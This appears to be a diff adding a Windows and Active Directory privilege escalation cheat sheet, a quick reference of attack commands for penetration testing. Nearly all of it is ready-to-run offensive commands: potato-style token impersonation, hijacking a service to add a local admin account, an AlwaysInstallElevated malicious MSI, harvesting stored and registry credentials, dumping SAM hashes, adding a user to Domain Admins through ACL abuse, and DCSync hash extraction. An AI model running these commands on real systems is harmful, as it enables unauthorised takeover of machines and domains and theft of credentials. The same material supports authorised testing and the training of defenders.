@@ -1,0 +1,60 @@
+WINDOWS PRIVILEGE ESCALATION - QUICK REF
+
+── SITUATIONAL AWARENESS ────────────────────────────────────────────────────────────────────────
+whoami /all                                          # user, groups, ALL privileges
+whoami /priv                                         # look for SeImpersonatePrivilege
+systeminfo                                           # OS version + hotfixes
+net localgroup administrators                        # who has local admin?
+
+── AUTOMATED ENUM (run first) ───────────────────────────────────────────────────────────────────
+.\winPEASx64.exe
+powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
+.\Seatbelt.exe -group=all
+
+── TOKEN PRIVILEGES (SeImpersonatePrivilege) ────────────────────────────────────────────────────
+.\PrintSpoofer64.exe -i -c cmd                                        Win10 / Server 2016+
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"                             most universal
+.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}                 older systems
+# SeBackupPrivilege: reg save HKLM\SAM + HKLM\SYSTEM → impacket-secretsdump -sam -system LOCAL
+
+── SERVICE EXPLOITS ─────────────────────────────────────────────────────────────────────────────
+# Unquoted paths:
+wmic service get name,pathname,startmode | findstr /i auto | findstr /v """ | findstr /v windows
+# Weak binary perms:
+icacls "C:\path\to\service.exe"                      BUILTIN\Users:(W) = writable → replace
+# Weak service ACL:
+.\accesschk.exe /accepteula -uwcqv <user> *
+sc config <svc> binpath= "cmd /c net user hacker P@ss123! /add"  →  sc stop/start <svc>
+
+── AlwaysInstallElevated ────────────────────────────────────────────────────────────────────────
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Both 0x1? → msfvenom ... -f msi -o evil.msi → msiexec /quiet /qn /i evil.msi
+
+── STORED CREDENTIALS ───────────────────────────────────────────────────────────────────────────
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    AutoLogon creds
+cmdkey /list  →  runas /savecred /user:<domain>\<user> cmd.exe
+reg query HKLM /f password /t REG_SZ /s
+type C:\Windows\Panther\Unattend.xml
+
+── SCHEDULED TASKS ──────────────────────────────────────────────────────────────────────────────
+schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"
+icacls <task binary>                                 writable → replace with payload
+
+── KERNEL EXPLOITS (last resort) ────────────────────────────────────────────────────────────────
+systeminfo > sysinfo.txt  →  python3 wesng.py sysinfo.txt
+
+═════════════════════════════════════════════════════════════════════════════════════════════════
+AD ESCALATION (domain-joined)
+
+bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc-fqdn> -c all --zip
+
+# ACL Abuse — GenericAll on user:
+net rpc password "<target>" "NewPass123!" -U "<domain>/<user>%<pass>" -S <dc-ip>
+
+# ACL Abuse — GenericAll on group:
+net rpc group addmem "Domain Admins" "<your-user>" -U "<domain>/<user>%<pass>" -S <dc-ip>
+
+# DCSync:
+impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>
+impacket-secretsdump <domain>/<user>@<dc-ip> -hashes :<NT-hash>
